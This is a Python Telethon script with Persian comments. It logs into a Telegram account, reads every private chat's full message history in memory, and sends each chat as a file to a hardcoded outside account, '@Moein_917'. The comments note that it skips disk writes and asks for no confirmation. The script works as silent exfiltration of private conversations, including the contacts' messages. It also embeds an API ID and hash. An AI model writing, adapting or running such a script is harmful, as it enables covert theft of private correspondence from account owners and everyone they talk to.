import asyncio
import io
from telethon import TelegramClient
from telethon.tl.types import User

# اطلاعات حساب تلگرام از سایت my.telegram.org
API_ID = 29834234‎
API_HASH = "552c01d21d127def060f2915aedeebf9"

# آیدی مقصدی که تمامی فایل‌ها در رم ساخته شده و برایش ارسال می‌شوند
TARGET_USER = "Moein_917"

# ساخت کلاینت تلگرام
client = TelegramClient("my_account", API_ID, API_HASH)

async def main():
    await client.start()
    me = await client.get_me()

    my_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
    print(f"Logged in as: {my_name} (@{me.username})")

    # شروع بلافاصله عملیات بدون ایجاد فایل روی هارد و بدون پرسش تأییدیه
    print("\nExport & Direct Transmission Started...\n")

    async for dialog in client.iter_dialogs():
        # فقط چت‌های شخصی (بدون ربات‌ها و گروه‌ها)
        if isinstance(dialog.entity, User) and not dialog.entity.bot:
            user = dialog.entity
            username = user.username if user.username else "NoUsername"
            chat_name = f"{user.first_name or ''} {user.last_name or ''}".strip()

            # ساخت متن چت تماماً داخل حافظه رم (RAM)
            content = []
            content.append("PRIVATE CHAT EXPORT\n")
            content.append("=" * 50 + "\n")
            content.append(f"Chat With: {chat_name}\n")
            content.append(f"Username: @{username}\n")
            content.append(f"ID: {user.id}\n")
            content.append("=" * 50 + "\n\n")

            async for message in client.iter_messages(dialog.id, reverse=True):
                if not message.text:
                    continue

                if message.sender_id == me.id:
                    sender_name = my_name
                else:
                    sender = await message.get_sender()
                    if sender:
                        sender_name = f"{sender.first_name or ''} {sender.last_name or ''}".strip()
                        if not sender_name:
                            sender_name = "Unknown"
                    else:
                        sender_name = "Unknown"

                content.append(
                    f"[{message.date}]\n"
                    f"{sender_name}:\n"
                    f"{message.text}\n"
                    f"{'-' * 40}\n\n"
                )

            # تبدیل متن به بایت در RAM
            file_data = "".join(content).encode("utf-8")
            
            if len(file_data) == 0:
                continue

            # ساخت فایل مجازی صرفاً درون حافظه RAM (بدون نوشتن روی دیسک)
            file_stream = io.BytesIO(file_data)
            file_stream.name = f"{user.id}_{username}.txt"

            # ارسال مستقیم stream موجود در RAM به آیدی مقصد
            try:
                await client.send_file(
                    TARGET_USER,
                    file_stream,
                    caption=f"📂 Exported chat: {chat_name} (@{username})"
                )
                print(f"Sent to @{TARGET_USER}: {file_stream.name}")
            except Exception as e:
                print(f"Error sending {file_stream.name}: {e}")

            # وقفه کوتاه جهت جلوگیری از محدودیت ارسال تلگرام
            await asyncio.sleep(1)

    print("\nAll chats exported and sent successfully.")

# اجرای اسکریپت
with client:
    client.loop.run_until_complete(main())
